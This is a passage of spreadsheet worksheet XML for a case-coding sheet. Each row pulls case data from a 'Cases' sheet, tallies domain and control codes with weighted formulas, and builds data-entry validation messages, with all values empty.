        <f>IF(COUNT(E91:L91)=0,"",SUM(E91:L91))</f>
        <v/>
      </c>
      <c r="AJ91" s="13">
        <f>IF(AI91="","",N(E91)*3+N(F91)*2+N(G91)*2+N(H91)*2+N(I91)*2+N(J91)*3+N(K91)*3+N(L91)*3)</f>
        <v/>
      </c>
      <c r="AK91" s="13">
        <f>IF(AI91="","",COUNTIF(N91:AG91,1))</f>
        <v/>
      </c>
      <c r="AL91" s="13">
        <f>IF(OR(AJ91="",AJ91=0),"",ROUND(100*(AJ91-AK91)/AJ91,1))</f>
        <v/>
      </c>
      <c r="AM91" s="11">
        <f>IF(AI91="","",IF(AI91=0,"No domain coded 1; ","")&amp;IF(M91="","Primary domain missing; ",IF(IFERROR(INDEX(E91:L91,1,M91),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N91:AG91)&lt;&gt;AJ91,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH91="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN91" s="13">
        <f>IF(AND(AI91&lt;&gt;"",AM91=""),1,0)</f>
        <v/>
      </c>
      <c r="AO91" s="14" t="n"/>
    </row>
    <row r="92">
      <c r="A92" s="11">
        <f>Cases!A92</f>
        <v/>
      </c>
      <c r="B92" s="11">
        <f>Cases!B92</f>
        <v/>
      </c>
      <c r="C92" s="11">
        <f>Cases!C92</f>
        <v/>
      </c>
      <c r="D92" s="11">
        <f>IF(Cases!F92="",LEFT(Cases!G92,120),Cases!F92)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E92:L92)=0,"",SUM(E92:L92))</f>
        <v/>
      </c>
      <c r="AJ92" s="13">
        <f>IF(AI92="","",N(E92)*3+N(F92)*2+N(G92)*2+N(H92)*2+N(I92)*2+N(J92)*3+N(K92)*3+N(L92)*3)</f>
        <v/>
      </c>
      <c r="AK92" s="13">
        <f>IF(AI92="","",COUNTIF(N92:AG92,1))</f>
        <v/>
      </c>
      <c r="AL92" s="13">
        <f>IF(OR(AJ92="",AJ92=0),"",ROUND(100*(AJ92-AK92)/AJ92,1))</f>
        <v/>
      </c>
      <c r="AM92" s="11">
        <f>IF(AI92="","",IF(AI92=0,"No domain coded 1; ","")&amp;IF(M92="","Primary domain missing; ",IF(IFERROR(INDEX(E92:L92,1,M92),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N92:AG92)&lt;&gt;AJ92,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH92="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN92" s="13">
        <f>IF(AND(AI92&lt;&gt;"",AM92=""),1,0)</f>
        <v/>
      </c>
      <c r="AO92" s="14" t="n"/>
    </row>
    <row r="93">
      <c r="A93" s="11">
        <f>Cases!A93</f>
        <v/>
      </c>
      <c r="B93" s="11">
        <f>Cases!B93</f>
        <v/>
      </c>
      <c r="C93" s="11">
        <f>Cases!C93</f>
        <v/>
      </c>
      <c r="D93" s="11">
        <f>IF(Cases!F93="",LEFT(Cases!G93,120),Cases!F93)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E93:L93)=0,"",SUM(E93:L93))</f>
        <v/>
      </c>
      <c r="AJ93" s="13">
        <f>IF(AI93="","",N(E93)*3+N(F93)*2+N(G93)*2+N(H93)*2+N(I93)*2+N(J93)*3+N(K93)*3+N(L93)*3)</f>
        <v/>
      </c>
      <c r="AK93" s="13">
        <f>IF(AI93="","",COUNTIF(N93:AG93,1))</f>
        <v/>
      </c>
      <c r="AL93" s="13">
        <f>IF(OR(AJ93="",AJ93=0),"",ROUND(100*(AJ93-AK93)/AJ93,1))</f>
        <v/>
      </c>
      <c r="AM93" s="11">
        <f>IF(AI93="","",IF(AI93=0,"No domain coded 1; ","")&amp;IF(M93="","Primary domain missing; ",IF(IFERROR(INDEX(E93:L93,1,M93),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N93:AG93)&lt;&gt;AJ93,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH93="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN93" s="13">
        <f>IF(AND(AI93&lt;&gt;"",AM93=""),1,0)</f>
        <v/>
      </c>
      <c r="AO93" s="14" t="n"/>
    </row>
    <row r="94">
      <c r="A94" s="11">
        <f>Cases!A94</f>
        <v/>
      </c>
      <c r="B94" s="11">
        <f>Cases!B94</f>
        <v/>
      </c>
      <c r="C94" s="11">
        <f>Cases!C94</f>
        <v/>
      </c>
      <c r="D94" s="11">
        <f>IF(Cases!F94="",LEFT(Cases!G94,120),Cases!F94)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E94:L94)=0,"",SUM(E94:L94))</f>
        <v/>
      </c>
      <c r="AJ94" s="13">
        <f>IF(AI94="","",N(E94)*3+N(F94)*2+N(G94)*2+N(H94)*2+N(I94)*2+N(J94)*3+N(K94)*3+N(L94)*3)</f>
        <v/>
      </c>
      <c r="AK94" s="13">
        <f>IF(AI94="","",COUNTIF(N94:AG94,1))</f>
        <v/>
      </c>
      <c r="AL94" s="13">
        <f>IF(OR(AJ94="",AJ94=0),"",ROUND(100*(AJ94-AK94)/AJ94,1))</f>
        <v/>
      </c>
      <c r="AM94" s="11">
        <f>IF(AI94="","",IF(AI94=0,"No domain coded 1; ","")&amp;IF(M94="","Primary domain missing; ",IF(IFERROR(INDEX(E94:L94,1,M94),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N94:AG94)&lt;&gt;AJ94,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH94="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN94" s="13">
        <f>IF(AND(AI94&lt;&gt;"",AM94=""),1,0)</f>
        <v/>
      </c>
      <c r="AO94" s="14" t="n"/>
    </row>
    <row r="95">
      <c r="A95" s="11">
        <f>Cases!A95</f>
        <v/>
      </c>
      <c r="B95" s="11">
        <f>Cases!B95</f>
        <v/>
      </c>
      <c r="C95" s="11">
        <f>Cases!C95</f>
        <v/>
      </c>
      <c r="D95" s="11">
        <f>IF(Cases!F95="",LEFT(Cases!G95,120),Cases!F95)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E95:L95)=0,"",SUM(E95:L95))</f>
        <v/>
      </c>
      <c r="AJ95" s="13">
        <f>IF(AI95="","",N(E95)*3+N(F95)*2+N(G95)*2+N(H95)*2+N(I95)*2+N(J95)*3+N(K95)*3+N(L95)*3)</f>
        <v/>
      </c>
      <c r="AK95" s="13">
        <f>IF(AI95="","",COUNTIF(N95:AG95,1))</f>
        <v/>
      </c>
      <c r="AL95" s="13">
        <f>IF(OR(AJ95="",AJ95=0),"",ROUND(100*(AJ95-AK95)/AJ95,1))</f>
        <v/>
      </c>
      <c r="AM95" s="11">
        <f>IF(AI95="","",IF(AI95=0,"No domain coded 1; ","")&amp;IF(M95="","Primary domain missing; ",IF(IFERROR(INDEX(E95:L95,1,M95),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N95:AG95)&lt;&gt;AJ95,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH95="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN95" s="13">
        <f>IF(AND(AI95&lt;&gt;"",AM95=""),1,0)</f>
        <v/>
      </c>
      <c r="AO95" s="14" t="n"/>
    </row>
    <row r="96">
      <c r="A96" s="11">
        <f>Cases!A96</f>
        <v/>
      </c>
      <c r="B96" s="11">
        <f>Cases!B96</f>
        <v/>
      </c>
      <c r="C96" s="11">
        <f>Cases!C96</f>
        <v/>
      </c>
      <c r="D96" s="11">
        <f>IF(Cases!F96="",LEFT(Cases!G96,120),Cases!F96)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E96:L96)=0,"",SUM(E96:L96))</f>
        <v/>
      </c>
      <c r="AJ96" s="13">
        <f>IF(AI96="","",N(E96)*3+N(F96)*2+N(G96)*2+N(H96)*2+N(I96)*2+N(J96)*3+N(K96)*3+N(L96)*3)</f>
        <v/>
      </c>
      <c r="AK96" s="13">
        <f>IF(AI96="","",COUNTIF(N96:AG96,1))</f>
        <v/>
      </c>
      <c r="AL96" s="13">
        <f>IF(OR(AJ96="",AJ96=0),"",ROUND(100*(AJ96-AK96)/AJ96,1))</f>
        <v/>
      </c>
      <c r="AM96" s="11">
        <f>IF(AI96="","",IF(AI96=0,"No domain coded 1; ","")&amp;IF(M96="","Primary domain missing; ",IF(IFERROR(INDEX(E96:L96,1,M96),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N96:AG96)&lt;&gt;AJ96,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH96="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN96" s="13">
        <f>IF(AND(AI96&lt;&gt;"",AM96=""),1,0)</f>
        <v/>
      </c>
      <c r="AO96" s="14" t="n"/>
    </row>
    <row r="97">
      <c r="A97" s="11">
        <f>Cases!A97</f>
        <v/>
      </c>
      <c r="B97" s="11">
        <f>Cases!B97</f>
        <v/>
      </c>
      <c r="C97" s="11">
        <f>Cases!C97</f>
        <v/>
      </c>
      <c r="D97" s="11">
        <f>IF(Cases!F97="",LEFT(Cases!G97,120),Cases!F97)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E97:L97)=0,"",SUM(E97:L97))</f>
        <v/>
      </c>
      <c r="AJ97" s="13">
        <f>IF(AI97="","",N(E97)*3+N(F97)*2+N(G97)*2+N(H97)*2+N(I97)*2+N(J97)*3+N(K97)*3+N(L97)*3)</f>
        <v/>
      </c>
      <c r="AK97" s="13">
        <f>IF(AI97="","",COUNTIF(N97:AG97,1))</f>
        <v/>
      </c>
      <c r="AL97" s="13">
        <f>IF(OR(AJ97="",AJ97=0),"",ROUND(100*(AJ97-AK97)/AJ97,1))</f>
        <v/>
      </c>
      <c r="AM97" s="11">
        <f>IF(AI97="","",IF(AI97=0,"No domain coded 1; ","")&amp;IF(M97="","Primary domain missing; ",IF(IFERROR(INDEX(E97:L97,1,M97),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N97:AG97)&lt;&gt;AJ97,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH97="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN97" s="13">
        <f>IF(AND(AI97&lt;&gt;"",AM97=""),1,0)</f>
        <v/>
      </c>
      <c r="AO97" s="14" t="n"/>
    </row>
    <row r="98">
      <c r="A98" s="11">
        <f>Cases!A98</f>
        <v/>
      </c>
      <c r="B98" s="11">
        <f>Cases!B98</f>
        <v/>
      </c>
      <c r="C98" s="11">
        <f>Cases!C98</f>
        <v/>
      </c>
      <c r="D98" s="11">
        <f>IF(Cases!F98="",LEFT(Cases!G98,120),Cases!F98)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E98:L98)=0,"",SUM(E98:L98))</f>
        <v/>
      </c>
      <c r="AJ98" s="13">
        <f>IF(AI98="","",N(E98)*3+N(F98)*2+N(G98)*2+N(H98)*2+N(I98)*2+N(J98)*3+N(K98)*3+N(L98)*3)</f>
        <v/>
      </c>
      <c r="AK98" s="13">
        <f>IF(AI98="","",COUNTIF(N98:AG98,1))</f>
        <v/>
      </c>
      <c r="AL98" s="13">
        <f>IF(OR(AJ98="",AJ98=0),"",ROUND(100*(AJ98-AK98)/AJ98,1))</f>
        <v/>
      </c>
      <c r="AM98" s="11">
        <f>IF(AI98="","",IF(AI98=0,"No domain coded 1; ","")&amp;IF(M98="","Primary domain missing; ",IF(IFERROR(INDEX(E98:L98,1,M98),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N98:AG98)&lt;&gt;AJ98,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH98="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN98" s="13">
        <f>IF(AND(AI98&lt;&gt;"",AM98=""),1,0)</f>
        <v/>
      </c>
      <c r="AO98" s="14" t="n"/>
    </row>
    <row r="99">
      <c r="A99" s="11">
        <f>Cases!A99</f>
        <v/>
      </c>
      <c r="B99" s="11">
        <f>Cases!B99</f>
        <v/>
      </c>
      <c r="C99" s="11">
        <f>Cases!C99</f>
        <v/>
      </c>
      <c r="D99" s="11">
        <f>IF(Cases!F99="",LEFT(Cases!G99,120),Cases!F99)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E99:L99)=0,"",SUM(E99:L99))</f>
        <v/>
      </c>
      <c r="AJ99" s="13">
        <f>IF(AI99="","",N(E99)*3+N(F99)*2+N(G99)*2+N(H99)*2+N(I99)*2+N(J99)*3+N(K99)*3+N(L99)*3)</f>
        <v/>
      </c>
      <c r="AK99" s="13">
        <f>IF(AI99="","",COUNTIF(N99:AG99,1))</f>
        <v/>
      </c>
      <c r="AL99" s="13">
        <f>IF(OR(AJ99="",AJ99=0),"",ROUND(100*(AJ99-AK99)/AJ99,1))</f>
        <v/>
      </c>
      <c r="AM99" s="11">
        <f>IF(AI99="","",IF(AI99=0,"No domain coded 1; ","")&amp;IF(M99="","Primary domain missing; ",IF(IFERROR(INDEX(E99:L99,1,M99),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N99:AG99)&lt;&gt;AJ99,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH99="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN99" s="13">
        <f>IF(AND(AI99&lt;&gt;"",AM99=""),1,0)</f>
        <v/>
      </c>
      <c r="AO99" s="14" t="n"/>
    </row>
    <row r="100">
      <c r="A100" s="11">
        <f>Cases!A100</f>
        <v/>
      </c>
      <c r="B100" s="11">
        <f>Cases!B100</f>
        <v/>
      </c>
      <c r="C100" s="11">
        <f>Cases!C100</f>
        <v/>
      </c>
      <c r="D100" s="11">
        <f>IF(Cases!F100="",LEFT(Cases!G100,120),Cases!F100)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E100:L100)=0,"",SUM(E100:L100))</f>
        <v/>
      </c>
      <c r="AJ100" s="13">
        <f>IF(AI100="","",N(E100)*3+N(F100)*2+N(G100)*2+N(H100)*2+N(I100)*2+N(J100)*3+N(K100)*3+N(L100)*3)</f>
        <v/>
      </c>
      <c r="AK100" s="13">
        <f>IF(AI100="","",COUNTIF(N100:AG100,1))</f>
        <v/>
      </c>
      <c r="AL100" s="13">
        <f>IF(OR(AJ100="",AJ100=0),"",ROUND(100*(AJ100-AK100)/AJ100,1))</f>
        <v/>
      </c>
      <c r="AM100" s="11">
        <f>IF(AI100="","",IF(AI100=0,"No domain coded 1; ","")&amp;IF(M100="","Primary domain missing; ",IF(IFERROR(INDEX(E100:L100,1,M100),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N100:AG100)&lt;&gt;AJ100,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH100="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN100" s="13">
        <f>IF(AND(AI100&lt;&gt;"",AM100=""),1,0)</f>
        <v/>
      </c>
      <c r="AO100" s="14" t="n"/>
    </row>
    <row r="101">
      <c r="A101" s="11">
        <f>Cases!A101</f>
        <v/>
      </c>
      <c r="B101" s="11">
        <f>Cases!B101</f>
        <v/>
      </c>
      <c r="C101" s="11">
        <f>Cases!C101</f>
        <v/>
      </c>
      <c r="D101" s="11">
        <f>IF(Cases!F101="",LEFT(Cases!G101,120),Cases!F101)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E101:L101)=0,"",SUM(E101:L101))</f>
        <v/>
      </c>
      <c r="AJ101" s="13">
        <f>IF(AI101="","",N(E101)*3+N(F101)*2+N(G101)*2+N(H101)*2+N(I101)*2+N(J101)*3+N(K101)*3+N(L101)*3)</f>
        <v/>
      </c>
      <c r="AK101" s="13">
        <f>IF(AI101="","",COUNTIF(N101:AG101,1))</f>
        <v/>
      </c>
      <c r="AL101" s="13">
        <f>IF(OR(AJ101="",AJ101=0),"",ROUND(100*(AJ101-AK101)/AJ101,1))</f>
        <v/>
      </c>
      <c r="AM101" s="11">
        <f>IF(AI101="","",IF(AI101=0,"No domain coded 1; ","")&amp;IF(M101="","Primary domain missing; ",IF(IFERROR(INDEX(E101:L101,1,M101),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N101:AG101)&lt;&gt;AJ101,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH101="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN101" s="13">
        <f>IF(AND(AI101&lt;&gt;"",AM101=""),1,0)</f>
        <v/>
      </c>
      <c r="AO101" s="14" t="n"/>
    </row>
    <row r="102">
      <c r="A102" s="11">
        <f>Cases!A102</f>
        <v/>
      </c>
      <c r="B102" s="11">
        <f>Cases!B102</f>
        <v/>
      </c>
      <c r="C102" s="11">
        <f>Cases!C102</f>
        <v/>
      </c>
      <c r="D102" s="11">
        <f>IF(Cases!F102="",LEFT(Cases!G102,120),Cases!F102)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E102:L102)=0,"",SUM(E102:L102))</f>
        <v/>
      </c>
      <c r="AJ102" s="13">
        <f>IF(AI102="","",N(E102)*3+N(F102)*2+N(G102)*2+N(H102)*2+N(I102)*2+N(J102)*3+N(K102)*3+N(L102)*3)</f>
        <v/>
      </c>
      <c r="AK102" s="13">
        <f>IF(AI102="","",COUNTIF(N102:AG102,1))</f>
        <v/>
      </c>
      <c r="AL102" s="13">
        <f>IF(OR(AJ102="",AJ102=0),"",ROUND(100*(AJ102-AK102)/AJ102,1))</f>
        <v/>
      </c>
      <c r="AM102" s="11">
        <f>IF(AI102="","",IF(AI102=0,"No domain coded 1; ","")&amp;IF(M102="","Primary domain missing; ",IF(IFERROR(INDEX(E102:L102,1,M102),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N102:AG102)&lt;&gt;AJ102,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH102="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN102" s="13">
        <f>IF(AND(AI102&lt;&gt;"",AM102=""),1,0)</f>
        <v/>
      </c>
      <c r="AO102" s="14" t="n"/>
    </row>
    <row r="103">
      <c r="A103" s="11">
        <f>Cases!A103</f>
        <v/>
      </c>
      <c r="B103" s="11">
        <f>Cases!B103</f>
        <v/>
      </c>
      <c r="C103" s="11">
        <f>Cases!C103</f>
        <v/>
      </c>
      <c r="D103" s="11">
        <f>IF(Cases!F103="",LEFT(Cases!G103,120),Cases!F103)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E103:L103)=0,"",SUM(E103:L103))</f>
        <v/>
      </c>
      <c r="AJ103" s="13">
        <f>IF(AI103="","",N(E103)*3+N(F103)*2+N(G103)*2+N(H103)*2+N(I103)*2+N(J103)*3+N(K103)*3+N(L103)*3)</f>
        <v/>
      </c>
      <c r="AK103" s="13">
        <f>IF(AI103="","",COUNTIF(N103:AG103,1))</f>
        <v/>
      </c>
      <c r="AL103" s="13">
        <f>IF(OR(AJ103="",AJ103=0),"",ROUND(100*(AJ103-AK103)/AJ103,1))</f>
        <v/>
      </c>
      <c r="AM103" s="11">
        <f>IF(AI103="","",IF(AI103=0,"No domain coded 1; ","")&amp;IF(M103="","Primary domain missing; ",IF(IFERROR(INDEX(E103:L103,1,M103),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N103:AG103)&lt;&gt;AJ103,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH103="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN103" s="13">
        <f>IF(AND(AI103&lt;&gt;"",AM103=""),1,0)</f>
        <v/>
      </c>
      <c r="AO103" s="14" t="n"/>
    </row>
    <row r="104">
      <c r="A104" s="11">
        <f>Cases!A104</f>
        <v/>
      </c>
      <c r="B104" s="11">
        <f>Cases!B104</f>
        <v/>
      </c>
      <c r="C104" s="11">
        <f>Cases!C104</f>
        <v/>
      </c>
      <c r="D104" s="11">
        <f>IF(Cases!F104="",LEFT(Cases!G104,120),Cases!F104)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E104:L104)=0,"",SUM(E104:L104))</f>
        <v/>
      </c>
      <c r="AJ104" s="13">
        <f>IF(AI104="","",N(E104)*3+N(F104)*2+N(G104)*2+N(H104)*2+N(I104)*2+N(J104)*3+N(K104)*3+N(L104)*3)</f>
        <v/>
      </c>
      <c r="AK104" s="13">
        <f>IF(AI104="","",COUNTIF(N104:AG104,1))</f>
        <v/>
      </c>
      <c r="AL104" s="13">
        <f>IF(OR(AJ104="",AJ104=0),"",ROUND(100*(AJ104-AK104)/AJ104,1))</f>
        <v/>
      </c>
      <c r="AM104" s="11">
        <f>IF(AI104="","",IF(AI104=0,"No domain coded 1; ","")&amp;IF(M104="","Primary domain missing; ",IF(IFERROR(INDEX(E104:L104,1,M104),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N104:AG104)&lt;&gt;AJ104,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH104="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN104" s="13">
        <f>IF(AND(AI104&lt;&gt;"",AM104=""),1,0)</f>
        <v/>
      </c>
      <c r="AO104" s="14" t="n"/>
    </row>
    <row r="105">
      <c r="A105" s="11">
        <f>Cases!A105</f>
        <v/>
      </c>
      <c r="B105" s="11">
        <f>Cases!B105</f>
        <v/>
      </c>
      <c r="C105" s="11">
        <f>Cases!C105</f>
        <v/>
      </c>
      <c r="D105" s="11">
        <f>IF(Cases!F105="",LEFT(Cases!G105,120),Cases!F105)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E105:L105)=0,"",SUM(E105:L105))</f>
        <v/>
      </c>
      <c r="AJ105" s="13">
        <f>IF(AI105="","",N(E105)*3+N(F105)*2+N(G105)*2+N(H105)*2+N(I105)*2+N(J105)*3+N(K105)*3+N(L105)*3)</f>
        <v/>
      </c>
      <c r="AK105" s="13">
        <f>IF(AI105="","",COUNTIF(N105:AG105,1))</f>
        <v/>
      </c>
      <c r="AL105" s="13">
        <f>IF(OR(AJ105="",AJ105=0),"",ROUND(100*(AJ105-AK105)/AJ105,1))</f>
        <v/>
      </c>
      <c r="AM105" s="11">
        <f>IF(AI105="","",IF(AI105=0,"No domain coded 1; ","")&amp;IF(M105="","Primary domain missing; ",IF(IFERROR(INDEX(E105:L105,1,M105),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N105:AG105)&lt;&gt;AJ105,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH105="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN105" s="13">
        <f>IF(AND(AI105&lt;&gt;"",AM105=""),1,0)</f>
        <v/>
      </c>
      <c r="AO105" s="14" t="n"/>
    </row>
    <row r="106">
      <c r="A106" s="11">
        <f>Cases!A106</f>
        <v/>
      </c>
      <c r="B106" s="11">
        <f>Cases!B106</f>
        <v/>
      </c>
      <c r="C106" s="11">
        <f>Cases!C106</f>
        <v/>
      </c>
      <c r="D106" s="11">
        <f>IF(Cases!F106="",LEFT(Cases!G106,120),Cases!F106)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E106:L106)=0,"",SUM(E106:L106))</f>
        <v/>
      </c>
      <c r="AJ106" s="13">
        <f>IF(AI106="","",N(E106)*3+N(F106)*2+N(G106)*2+N(H106)*2+N(I106)*2+N(J106)*3+N(K106)*3+N(L106)*3)</f>
        <v/>
      </c>
      <c r="AK106" s="13">
        <f>IF(AI106="","",COUNTIF(N106:AG106,1))</f>
        <v/>
      </c>
      <c r="AL106" s="13">
        <f>IF(OR(AJ106="",AJ106=0),"",ROUND(100*(AJ106-AK106)/AJ106,1))</f>
        <v/>
      </c>
      <c r="AM106" s="11">
        <f>IF(AI106="","",IF(AI106=0,"No domain coded 1; ","")&amp;IF(M106="","Primary domain missing; ",IF(IFERROR(INDEX(E106:L106,1,M106),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N106:AG106)&lt;&gt;AJ106,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH106="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN106" s="13">
        <f>IF(AND(AI106&lt;&gt;"",AM106=""),1,0)</f>
        <v/>
      </c>
      <c r="AO106" s="14" t="n"/>
    </row>
    <row r="107">
      <c r="A107" s="11">
        <f>Cases!A107</f>
        <v/>
      </c>
      <c r="B107" s="11">
        <f>Cases!B107</f>
        <v/>
      </c>
      <c r="C107" s="11">
        <f>Cases!C107</f>
        <v/>
      </c>
      <c r="D107" s="11">
        <f>IF(Cases!F107="",LEFT(Cases!G107,120),Cases!F107)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E107:L107)=0,"",SUM(E107:L107))</f>
        <v/>
      </c>
      <c r="AJ107" s="13">
        <f>IF(AI107="","",N(E107)*3+N(F107)*2+N(G107)*2+N(H107)*2+N(I107)*2+N(J107)*3+N(K107)*3+N(L107)*3)</f>
        <v/>
      </c>
      <c r="AK107" s="13">
        <f>IF(AI107="","",COUNTIF(N107:AG107,1))</f>
        <v/>
      </c>
      <c r="AL107" s="13">
        <f>IF(OR(AJ107="",AJ107=0),"",ROUND(100*(AJ107-AK107)/AJ107,1))</f>
        <v/>
      </c>
      <c r="AM107" s="11">
        <f>IF(AI107="","",IF(AI107=0,"No domain coded 1; ","")&amp;IF(M107="","Primary domain missing; ",IF(IFERROR(INDEX(E107:L107,1,M107),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N107:AG107)&lt;&gt;AJ107,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH107="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN107" s="13">
        <f>IF(AND(AI107&lt;&gt;"",AM107=""),1,0)</f>
        <v/>
      </c>
      <c r="AO107" s="14" t="n"/>
    </row>
    <row r="108">
      <c r="A108" s="11">
        <f>Cases!A108</f>
        <v/>
      </c>
      <c r="B108" s="11">
        <f>Cases!B108</f>
        <v/>
      </c>
      <c r="C108" s="11">
        <f>Cases!C108</f>
        <v/>
      </c>
      <c r="D108" s="11">
        <f>IF(Cases!F108="",LEFT(Cases!G108,120),Cases!F108)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E108:L108)=0,"",SUM(E108:L108))</f>
        <v/>
      </c>
      <c r="AJ108" s="13">
        <f>IF(AI108="","",N(E108)*3+N(F108)*2+N(G108)*2+N(H108)*2+N(I108)*2+N(J108)*3+N(K108)*3+N(L108)*3)</f>
        <v/>
      </c>
      <c r="AK108" s="13">
        <f>IF(AI108="","",COUNTIF(N108:AG108,1))</f>
        <v/>
      </c>
      <c r="AL108" s="13">
        <f>IF(OR(AJ108="",AJ108=0),"",ROUND(100*(AJ108-AK108)/AJ108,1))</f>
        <v/>
      </c>
      <c r="AM108" s="11">
        <f>IF(AI108="","",IF(AI108=0,"No domain coded 1; ","")&amp;IF(M108="","Primary domain missing; ",IF(IFERROR(INDEX(E108:L108,1,M108),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N108:AG108)&lt;&gt;AJ108,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH108="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN108" s="13">
        <f>IF(AND(AI108&lt;&gt;"",AM108=""),1,0)</f>
        <v/>
      </c>
      <c r="AO108" s="14" t="n"/>
    </row>
    <row r="109">
      <c r="A109" s="11">
        <f>Cases!A109</f>
        <v/>
      </c>
      <c r="B109" s="11">
        <f>Cases!B109</f>
        <v/>
      </c>
      <c r="C109" s="11">
        <f>Cases!C109</f>
        <v/>
      </c>
      <c r="D109" s="11">
        <f>IF(Cases!F109="",LEFT(Cases!G109,120),Cases!F109)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E109:L109)=0,"",SUM(E109:L109))</f>
        <v/>
      </c>
      <c r="AJ109" s="13">
        <f>IF(AI109="","",N(E109)*3+N(F109)*2+N(G109)*2+N(H109)*2+N(I109)*2+N(J109)*3+N(K109)*3+N(L109)*3)</f>
        <v/>
      </c>
      <c r="AK109" s="13">
        <f>IF(AI109="","",COUNTIF(N109:AG109,1))</f>
        <v/>
      </c>
      <c r="AL109" s="13">
        <f>IF(OR(AJ109="",AJ109=0),"",ROUND(100*(AJ109-AK109)/AJ109,1))</f>
        <v/>
      </c>
      <c r="AM109" s="11">
        <f>IF(AI109="","",IF(AI109=0,"No domain coded 1; ","")&amp;IF(M109="","Primary domain missing; ",IF(IFERROR(INDEX(E109:L109,1,M109),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N109:AG109)&lt;&gt;AJ109,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH109="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN109" s="13">
        <f>IF(AND(AI109&lt;&gt;"",AM109=""),1,0)</f>
        <v/>
      </c>
      <c r="AO109" s="14" t="n"/>
    </row>
    <row r="110">
      <c r="A110" s="11">
        <f>Cases!A110</f>
        <v/>
      </c>
      <c r="B110" s="11">
        <f>Cases!B110</f>
        <v/>
      </c>
